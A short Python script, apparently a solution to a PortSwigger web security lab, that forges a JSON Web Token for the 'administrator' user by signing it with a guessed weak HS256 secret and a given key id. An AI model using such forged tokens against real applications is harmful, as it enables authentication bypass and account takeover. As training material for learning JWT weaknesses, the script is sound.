import jwt
import time

# Secret key (base64 encoded)
secret = "secret1"

# Header
header = {
  "kid": "878e58bc-56a8-4e64-8c19-784fba1a73b7",
  "alg": "HS256"
}

# Payload
payload = {
  "iss": "portswigger",
  "exp": 1740402251,
  "sub": "administrator"
}

# Encode the token
encoded_token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print(encoded_token)